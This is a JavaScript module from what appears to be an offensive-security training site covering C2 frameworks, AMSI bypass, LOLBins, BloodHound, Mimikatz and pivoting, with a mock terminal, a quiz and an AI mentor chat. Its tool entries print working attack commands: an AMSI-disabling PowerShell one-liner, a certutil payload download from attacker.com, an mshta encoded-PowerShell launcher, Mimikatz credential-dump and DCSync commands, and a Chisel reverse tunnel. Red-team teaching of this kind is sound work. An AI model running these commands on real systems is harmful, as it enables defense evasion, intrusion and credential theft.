// ==========================================
// PWNBOX MODULE 08: BLACK OPS & C2 EVASION
// API Key loaded from js/config.js
// ==========================================
const apiKey = (typeof window !== "undefined" && window.GROQ_API_KEY) || 
                 (typeof GROQ_API_KEY !== "undefined" ? GROQ_API_KEY : "") || 
                 localStorage.getItem('pwnbox_groq_api_key') || 
                 "";

const MODULE_KEY       = 'module_blackops_completed';
const CUSTOM_TOOLS_KEY = 'blackops_custom_tools';
const EDITED_TOOLS_KEY = 'blackops_edited_default_tools';
const DELETED_TOOLS_KEY= 'blackops_deleted_default_indices';
const CUSTOM_CATS_KEY  = 'blackops_custom_categories';

const defaultTools = [
    {
        name: "1. Cobalt Strike & Havoc C2",
        link: "https://github.com/HavocFramework/Havoc",
        category: "CommandControl",
        brief: "Advanced adversary simulation and post-exploitation Command & Control (C2) frameworks. Enables red teams to deploy lightweight in-memory agent beacons, establish stealthy HTTPS/DNS listeners, customize malleable C2 network signatures to mimic legitimate traffic (like Amazon or Microsoft CDNs), and execute post-exploitation modules with Sleep Mask encryption.",
        use: "Havoc Client setup: <code>./havoc client</code><br>Deploy Demon Beacon: <code>demon -l https://c2.internal -s 45s -j 20%</code><br>Spawn stealth process: <code>inline-execute sleepmask.o</code>",
        useful: "Modern EDRs detect standard reverse shells immediately. C2 frameworks use encrypted beacon jitter, asynchronous check-ins, and in-memory execution to maintain persistent access across enterprise networks without tripping behavioral alarms."
    },
    {
        name: "2. AMSI & EDR Memory Bypasser",
        link: "https://amsi.fail",
        category: "DefenseEvasion",
        brief: "In-memory patcher targeting Microsoft's Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW). By overwriting the starting bytes of 'AmsiScanBuffer' in amsi.dll with an x86 return instruction (0xC3 / RET), any subsequent malicious PowerShell script or C# binary passes through the scanner without inspection.",
        use: "One-liner PowerShell in-memory patch:<br><code>$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)</code><br>Direct memory patching: <code>[MemoryPatch]::PatchAmsi()</code>",
        useful: "Allows security testers to execute Mimikatz or SharpHound directly inside PowerShell memory without Windows Defender detecting or killing the process."
    },
    {
        name: "3. LOLBins (Living Off the Land)",
        link: "https://lolbas-project.github.io",
        category: "DefenseEvasion",
        brief: "Living Off the Land Binaries and Scripts (LOLBAS). Attack techniques that abuse trusted, digitally signed Microsoft operating system executables (like certutil, bitsadmin, mshta, and rundll32) to download malicious payloads, execute shellcode, or bypass application whitelisting without installing external hacker tools.",
        use: "Download payload silently:<br><code>certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe</code><br>Execute remote HTA payload:<br><code>mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -enc ...\"\",0\"))</code>",
        useful: "EDR tools cannot simply block certutil or bitsadmin because genuine Windows updates and system services require them. LOLBins let attackers blend into normal system administration activity."
    },
    {
        name: "4. BloodHound & SharpHound",
        link: "https://github.com/BloodHoundAD/BloodHound",
        category: "ActiveDirectory",
        brief: "A graph theory tool that uncovers hidden, unintended relationships and privilege escalation paths within an Active Directory (AD) domain. It collects ACL permissions, group memberships, session data, and Kerberos delegation rules, mapping the fastest visual path from a compromised low-priv user to full Domain Admin.",
        use: "Run ingestor on target:<br><code>.\\SharpHound.exe -c All --outputdirectory C:\\temp</code><br>Import generated .zip into BloodHound GUI and query: <code>Shortest Paths to Domain Admins</code>",
        useful: "In enterprise domains with thousands of users, manual AD privilege escalation takes days. BloodHound computes shortest attack graphs in seconds, showing exact misconfigurations (like GenericAll or WriteDacl)."
    },
    {
        name: "5. Mimikatz & LSASS Dumpr",
        link: "https://github.com/gentilkiwi/mimikatz",
        category: "CredentialTheft",
        brief: "The industry standard credential extraction tool. It interacts directly with the Windows Local Security Authority Subsystem Service (LSASS) process memory to extract plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from memory, and forge Golden/Silver Kerberos tickets.",
        use: "Privilege elevation: <code>privilege::debug</code><br>Extract logon credentials: <code>sekurlsa::logonpasswords</code><br>Execute DCSync domain password replication: <code>lsadump::dcsync /domain:corp.local /user:Administrator</code>",
        useful: "Grants instantaneous lateral movement capability across an entire Active Directory forest without cracking hashes."
    },
    {
        name: "6. Chisel & Ligolo-ng",
        link: "https://github.com/nicocha30/ligolo-ng",
        category: "Pivoting",
        brief: "High-performance reverse tunneling and multi-network pivoting proxies. Creates an encrypted TCP/UDP tunnel over HTTP/WebSockets through corporate firewalls, transforming the compromised perimeter server into a pivot bridge to scan and exploit isolated internal subnets.",
        use: "Attacker listener: <code>./chisel server -p 8080 --reverse</code><br>Victim client tunnel: <code>chisel.exe client attacker.com:8080 R:1080:socks</code><br>Now route tools through tunnel: <code>proxychains nmap -sT 10.10.10.0/24</code>",
        useful: "Internal corporate networks (finance, databases) are completely unreachable from the public internet. Pivoting tools route entire toolkits through a single compromised gateway."
    }
];

let tools = [];
let editingToolIndex = null;

const categoriesTemplate = {
    "CommandControl": [],
    "DefenseEvasion": [],
    "CredentialTheft": [],
    "ActiveDirectory": [],
    "Pivoting": []
};
const catDisplayNamesTemplate = {
    "CommandControl": "🎮 Command & Control",
    "DefenseEvasion": "🛡️ Defense Evasion",
    "CredentialTheft": "🔑 Credential Theft",
    "ActiveDirectory": "🌐 Active Directory",
    "Pivoting": "🔀 Pivoting & Tunneling"
};
const defaultCategoryOptionsHtml = `
            <option value="CommandControl">🎮 Command & Control</option>
            <option value="DefenseEvasion">🛡️ Defense Evasion</option>
            <option value="CredentialTheft">🔑 Credential Theft</option>
            <option value="ActiveDirectory">🌐 Active Directory</option>
            <option value="Pivoting">🔀 Pivoting & Tunneling</option>`;

function init() {
    const list = document.getElementById('toolList');
    if (!list) return;
    list.innerHTML = '';

    const moduleCategories = {};
    for (const k of Object.keys(categoriesTemplate)) moduleCategories[k] = [];
    const moduleCatDisplayNames = { ...catDisplayNamesTemplate };

    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        for (const [k, v] of Object.entries(customCats)) {
            moduleCategories[k] = [];
            moduleCatDisplayNames[k] = v;
        }
    } catch(e) { console.error(e); }

    const defaultCatKey = Object.keys(moduleCategories)[0];
    tools.forEach((tool, index) => {
        const cat = tool.category || defaultCatKey;
        if (moduleCategories[cat]) moduleCategories[cat].push({ tool, index });
        else {
            if (!moduleCategories[defaultCatKey]) moduleCategories[defaultCatKey] = [];
            moduleCategories[defaultCatKey].push({ tool, index });
        }
    });

    for (const [catName, catTools] of Object.entries(moduleCategories)) {
        if (catTools.length === 0) continue;
        const h = document.createElement('div');
        h.className = 'category-header';
        h.innerText = moduleCatDisplayNames[catName] || catName;
        list.appendChild(h);
        catTools.forEach(({ tool, index }) => {
            const div = document.createElement('div');
            div.className = 'tool-item';
            div.innerText = tool.name.split('.')[1]?.trim() || tool.name;
            div.onclick = () => showDetails(index, div);
            list.appendChild(div);
        });
    }

    if (!apiKey) {
        const dot = document.getElementById('statusDot');
        if (dot) dot.classList.remove('online');
        if (typeof addBotMessage === 'function') {
            addBotMessage("⚠️ API key not configured. Please configure GROQ_API_KEY in js/config.js.");
        }
    }
}

function reloadAllTools() {
    tools = defaultTools.map((t, idx) => ({ ...t, originalIndex: idx }));
    try {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        tools = tools.filter(t => !del.includes(t.originalIndex));
    } catch(e) {}
    try {
        const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
        tools.forEach(t => { if (edited[t.originalIndex]) Object.assign(t, edited[t.originalIndex]); });
    } catch(e) {}
    loadCustomTools();
    init();
}

function showDetails(index, element) {
    document.querySelectorAll('.tool-item').forEach(el => el.classList.remove('active'));
    if (element) element.classList.add('active');
    const tool = tools[index];
    if (!tool) return;
    const catClass = `badge-${(tool.category || '').toLowerCase()}`;
    const displayCatName = (tool.category || '').replace(/_/g, ' ');
    const detailsPanel = document.getElementById('detailsPanel');
    if (!detailsPanel) return;

    detailsPanel.innerHTML = `
        <div class="card">
            <h1 style="display:flex;justify-content:space-between;align-items:center;width:100%;">
                <span>${tool.name.split('.')[1]?.trim() || tool.name}<span class="badge ${catClass}">${displayCatName}</span></span>
                <div style="display:flex;gap:8px;align-items:center;">
                    <button class="btn btn-edit-tool" onclick="openEditToolModal(${index})" style="font-size:0.8rem;padding:6px 12px;">✏️ Edit</button>
                    <button class="btn btn-delete-tool" onclick="confirmDeleteTool(${index})" style="font-size:0.8rem;padding:6px 12px;">🗑️ Delete</button>
                    <a href="${tool.link}" target="_blank" style="font-size:0.8rem;padding:6px 12px;">Launch ↗</a>
                </div>
            </h1>
            <div class="section-label">Simply Explained (What is it?)</div>
            <div class="section-content">${tool.brief}</div>
            <div class="section-label">How to actually use it</div>
            <div class="section-content">${tool.use}</div>
            <div class="section-label">Why Hackers care about this</div>
            <div class="section-content">${tool.useful}</div>
        </div>`;
    if (window.innerWidth <= 768) switchMobileTab('details');
}

function updateCompletionButton() {
    const btn = document.getElementById('completeModuleBtn');
    if (!btn) return;
    const done = localStorage.getItem(MODULE_KEY) === 'true';
    btn.innerText = done ? "✓ Module Completed" : "Mark Module Completed";
    btn.classList.toggle('completed', done);
}

function toggleModuleCompletion() {
    localStorage.setItem(MODULE_KEY, !(localStorage.getItem(MODULE_KEY) === 'true'));
    updateCompletionButton();
}

function openAddToolModal() {
    editingToolIndex = null;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Add Custom Tool";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Add Tool";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
    const nameInput = document.getElementById('toolName');
    if (nameInput) nameInput.focus();
}

function openEditToolModal(index) {
    editingToolIndex = index;
    const tool = tools[index];
    if (!tool) return;
    const title = document.querySelector('#addToolModal h3');
    if (title) title.innerText = "Edit Tool Info";
    const sub = document.querySelector('#addToolForm button[type="submit"]');
    if (sub) sub.innerText = "Save Changes";
    const form = document.getElementById('addToolForm');
    if (form) form.reset();
    cancelNewCategory();
    loadCustomCategories();
    document.getElementById('toolName').value = tool.name.includes('.') ? tool.name.split('.')[1].trim() : tool.name.trim();
    document.getElementById('toolLink').value = tool.link;
    document.getElementById('toolCategory').value = tool.category;
    document.getElementById('toolBrief').value = tool.brief;
    document.getElementById('toolUse').value = tool.use;
    document.getElementById('toolUseful').value = tool.useful;
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.style.display = 'flex';
        modal.offsetHeight;
        modal.classList.add('active');
    }
}

function closeAddToolModal() {
    const modal = document.getElementById('addToolModal');
    if (modal) {
        modal.classList.remove('active');
        setTimeout(() => {
            modal.style.display = 'none';
            const form = document.getElementById('addToolForm');
            if (form) form.reset();
        }, 300);
    }
}

function loadCustomTools() {
    try {
        const stored = localStorage.getItem(CUSTOM_TOOLS_KEY);
        if (stored) {
            JSON.parse(stored).forEach((tool, idx) => {
                const match = tool.name.match(/^\d+\.\s*(.*)$/);
                tool.name = `${tools.length + 1}. ${match ? match[1] : tool.name}`;
                tool.originalIndex = null;
                tool.customIndex = idx;
                tools.push(tool);
            });
        }
    } catch(e) { console.error(e); }
}

function submitNewTool(e) {
    if (e && e.preventDefault) e.preventDefault();
    const vals = {
        name: document.getElementById('toolName').value.trim(),
        link: document.getElementById('toolLink').value.trim(),
        category: document.getElementById('toolCategory').value,
        brief: document.getElementById('toolBrief').value.trim(),
        use: document.getElementById('toolUse').value.trim(),
        useful: document.getElementById('toolUseful').value.trim()
    };

    if (editingToolIndex !== null) {
        const orig = tools[editingToolIndex];
        if (orig && orig.originalIndex !== null) {
            const edited = JSON.parse(localStorage.getItem(EDITED_TOOLS_KEY) || '{}');
            edited[orig.originalIndex] = vals;
            localStorage.setItem(EDITED_TOOLS_KEY, JSON.stringify(edited));
        } else if (orig) {
            const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
            ct[orig.customIndex] = vals;
            localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.push(vals);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }

    closeAddToolModal();
    reloadAllTools();
    setTimeout(() => {
        let foundIndex = 0, newToolEl = null;
        tools.forEach((t, idx) => {
            if ((t.name.includes('.') ? t.name.split('.')[1].trim() : t.name.trim()) === vals.name) foundIndex = idx;
        });
        document.querySelectorAll('.tool-item').forEach(el => {
            if (el.innerText === vals.name) newToolEl = el;
        });
        if (newToolEl) showDetails(foundIndex, newToolEl);
    }, 100);
}

function confirmDeleteTool(index) {
    const rawName = tools[index].name.includes('.') ? tools[index].name.split('.')[1].trim() : tools[index].name.trim();
    if (typeof window.tacticalConfirm === 'function') {
        window.tacticalConfirm({
            title: "DELETE CUSTOM TOOL",
            message: `Are you sure you want to delete "${rawName}" from your active tool arsenal?`,
            confirmText: "🗑️ DELETE TOOL",
            cancelText: "CANCEL",
            type: "danger",
            onConfirm: () => deleteTool(index)
        });
    } else if (confirm(`Are you sure you want to delete "${rawName}"?`)) {
        deleteTool(index);
    }
}

function deleteTool(index) {
    const tool = tools[index];
    if (!tool) return;
    if (tool.originalIndex !== null) {
        const del = JSON.parse(localStorage.getItem(DELETED_TOOLS_KEY) || '[]');
        if (!del.includes(tool.originalIndex)) {
            del.push(tool.originalIndex);
            localStorage.setItem(DELETED_TOOLS_KEY, JSON.stringify(del));
        }
    } else {
        const ct = JSON.parse(localStorage.getItem(CUSTOM_TOOLS_KEY) || '[]');
        ct.splice(tool.customIndex, 1);
        localStorage.setItem(CUSTOM_TOOLS_KEY, JSON.stringify(ct));
    }
    reloadAllTools();
    document.getElementById('detailsPanel').innerHTML = `<div style="text-align:center;color:var(--text-muted);margin-top:20vh;"><h3>Select a tool from the menu to view beginner-friendly intelligence data.</h3></div>`;
}

function loadCustomCategories() {
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        const sel = document.getElementById('toolCategory');
        if (!sel) return;
        sel.innerHTML = defaultCategoryOptionsHtml;
        for (const [k, v] of Object.entries(customCats)) {
            sel.innerHTML += `<option value="${k}">${v}</option>`;
        }
    } catch(e) { console.error(e); }
}

function showNewCategoryForm() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'block';
    const nameInput = document.getElementById('newCategoryName');
    if (nameInput) nameInput.focus();
}

function cancelNewCategory() {
    const grp = document.getElementById('newCategoryGroup');
    if (grp) grp.style.display = 'none';
    const n = document.getElementById('newCategoryName');
    if (n) n.value = '';
    const i = document.getElementById('newCategoryIcon');
    if (i) i.value = '';
}

function saveNewCategory() {
    const name = document.getElementById('newCategoryName').value.trim();
    const icon = document.getElementById('newCategoryIcon').value.trim() || '⚙️';
    if (!name) return;
    const key = name.replace(/\s+/g, '');
    const label = `${icon} ${name}`;
    try {
        const customCats = JSON.parse(localStorage.getItem(CUSTOM_CATS_KEY) || '{}');
        customCats[key] = label;
        localStorage.setItem(CUSTOM_CATS_KEY, JSON.stringify(customCats));
        loadCustomCategories();
        document.getElementById('toolCategory').value = key;
        cancelNewCategory();
    } catch(e) { console.error(e); }
}

function switchMobileTab(tabId) {
    document.querySelectorAll('.nav-tab').forEach(btn => btn.classList.toggle('active', btn.getAttribute('onclick').includes(tabId)));
    document.body.className = document.body.className.replace(/\btab-\w+\b/g,'').trim();
    document.body.classList.add('tab-' + tabId);
}

window.openAddToolModal = openAddToolModal;
window.openEditToolModal = openEditToolModal;
window.closeAddToolModal = closeAddToolModal;
window.submitNewTool = submitNewTool;
window.confirmDeleteTool = confirmDeleteTool;
window.showNewCategoryForm = showNewCategoryForm;
window.cancelNewCategory = cancelNewCategory;
window.saveNewCategory = saveNewCategory;
window.switchMobileTab = switchMobileTab;
window.toggleModuleCompletion = toggleModuleCompletion;
window.showDetails = showDetails;
window.reloadAllTools = reloadAllTools;
// --- PANEL TAB SWITCHING ---
function switchPanelTab(tabName) {
    document.querySelectorAll('.panel-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(c => {
        c.classList.remove('active');
        c.style.display = 'none';
    });

    if (tabName === 'chat') {
        const btn = document.querySelector(".panel-tab[onclick*='chat']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('chatTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'terminal') {
        const btn = document.querySelector(".panel-tab[onclick*='terminal']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('terminalTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    } else if (tabName === 'quiz') {
        const btn = document.querySelector(".panel-tab[onclick*='quiz']");
        if (btn) btn.classList.add('active');
        const cont = document.getElementById('quizTabContent');
        if (cont) { cont.classList.add('active'); cont.style.display = 'flex'; }
    }
}

// --- TERMINAL COMMAND SANDBOX ---
function handleTerminalEnter(e) {
    if (e.key === 'Enter') {
        const input = document.getElementById('terminalInput');
        const cmd = input.value.trim().toLowerCase();
        input.value = '';
        executeTerminalCommand(cmd);
    }
}

function executeTerminalCommand(cmd) {
    const output = document.getElementById('terminalOutput');
    if (!output) return;

    const row = document.createElement('div');
    row.style.marginBottom = '6px';
    row.innerHTML = `<span style="color: #c084fc;">operator@blackops:~#</span> <span style="color: #ffffff;">${cmd}</span>`;
    output.appendChild(row);

    const res = document.createElement('div');
    res.style.marginBottom = '12px';

    if (cmd === 'help') {
        res.innerHTML = `
            <div style="color: #9333ea;">AVAILABLE BLACK OPS COMMANDS:</div>
            <div>- <b>beacon</b>: Spawn an in-memory HTTPS C2 beacon</div>
            <div>- <b>amsi-patch</b>: Apply AmsiScanBuffer memory bypass</div>
            <div>- <b>lolbins</b>: Simulate certutil.exe Living-Off-The-Land download</div>
            <div>- <b>dump-lsass</b>: Simulate in-memory LSASS credential extraction</div>
            <div>- <b>clear</b>: Clear terminal display</div>
        `;
    } else if (cmd === 'beacon') {
        res.innerHTML = `<span style="color: #10b981;">[+] Generating Havoc Demon shellcode...<br/>[+] Injecting into notepad.exe (PID 4820)...<br/>[+] Beacon established to https://c2.internal (Sleep: 30s, Jitter: 15%)<br/>[+] C2 SESSION 1 ACTIVE</span>`;
    } else if (cmd === 'amsi-patch') {
        res.innerHTML = `<span style="color: #eab308;">[*] Locating amsi.dll base address in process memory...<br/>[*] Offset AmsiScanBuffer found at 0x7FFA1920B2<br/>[+] Overwriting opcode bytes with 0xC3 (RET)...<br/>[✓] AMSI BYPASS SUCCESSFUL: In-memory scripts will not be scanned.</span>`;
    } else if (cmd === 'lolbins') {
        res.innerHTML = `<span style="color: #38bdf8;">[*] Invoking certutil.exe -urlcache -split -f http://10.10.14.5/stage.bin<br/>[+] Download complete. Process executed under trusted Microsoft digital certificate.</span>`;
    } else if (cmd === 'dump-lsass') {
        res.innerHTML = `<span style="color: #ef4444;">[!] Accessing LSASS memory handle via SeDebugPrivilege...<br/>[+] Dumping NTLM hashes:<br/>&nbsp;&nbsp;&nbsp;&nbsp;Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>&nbsp;&nbsp;&nbsp;&nbsp;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::</span>`;
    } else if (cmd === 'clear') {
        output.innerHTML = '';
        return;
    } else {
        res.innerHTML = `<span style="color: #ef4444;">Command not recognized. Type 'help' for stealth commands.</span>`;
    }

    output.appendChild(res);
    output.scrollTop = output.scrollHeight;
}

// --- QUIZ VERIFICATION ---
function checkQuizAnswer(qNum, correctVal) {
    const selected = document.querySelector(`input[name="q${qNum}"]:checked`);
    if (!selected) return;

    if (selected.value === correctVal) {
        if (window.showCustomAlert) {
            window.showCustomAlert("✓ CORRECT!", "Outstanding! You correctly identified the Black Ops evasion mechanism.", "success");
        } else {
            alert("✓ CORRECT! That is the proper evasion mechanism.");
        }
    } else {
        if (window.showCustomAlert) {
            window.showCustomAlert("✕ INCORRECT", "Review the C2 architecture and evasion notes and try again.", "error");
        } else {
            alert("✕ INCORRECT. Review the C2 evasion notes.");
        }
    }
}

// --- AI MENTOR (GROQ INTEGRATION) ---
async function sendMessage() {
    const input = document.getElementById('chatInput');
    const msg = input.value.trim();
    if (!msg) return;

    const history = document.getElementById('chatHistory');
    const userDiv = document.createElement('div');
    userDiv.className = 'msg user';
    userDiv.textContent = msg;
    history.appendChild(userDiv);
    input.value = '';

    const botDiv = document.createElement('div');
    botDiv.className = 'msg bot';
    botDiv.textContent = 'Decrypting intelligence response...';
    history.appendChild(botDiv);
    history.scrollTop = history.scrollHeight;

    try {
        const sysPrompt = "You are the PwnBox Module 08 Classified Black Ops AI Mentor. You specialize in advanced adversary simulation, C2 frameworks (Cobalt Strike, Havoc), in-memory AMSI/ETW evasion, Living-off-the-Land (LOLBins), Active Directory Kerberos attack chains, and internal pivoting. Answer concisely, technically, and strictly for ethical educational red teaming.";
        
        let data;
        if (typeof window !== "undefined" && window.GroqService && window.GroqService.callGroqChat) {
            data = await window.GroqService.callGroqChat({
                model: "openai/gpt-oss-20b",
                messages: [
                    { role: "system", content: sysPrompt },
                    { role: "user", content: msg }
                ],
                temperature: 0.6,
                max_tokens: 2048
            });
        } else {
            const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                    "Authorization": `Bearer ${apiKey}`,
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    model: "openai/gpt-oss-20b",
                    messages: [
                        { role: "system", content: sysPrompt },
                        { role: "user", content: msg }
                    ],
                    temperature: 0.6,
                    max_tokens: 2048
                })
            });
            data = await response.json();
        }

        if (data.choices && data.choices[0]) {
            botDiv.innerHTML = data.choices[0].message.content.replace(/\n/g, '<br/>');
        } else {
            botDiv.textContent = "Error: Classified downlink connection interrupted.";
        }
    } catch (e) {
        botDiv.textContent = "Downlink failed. Ensure Groq API key is valid in js/config.js.";
    }
    history.scrollTop = history.scrollHeight;
}

function handleEnter(e) {
    if (e.key === 'Enter') sendMessage();
}

document.addEventListener('DOMContentLoaded', () => {
    reloadAllTools();
    updateCompletionButton();
});
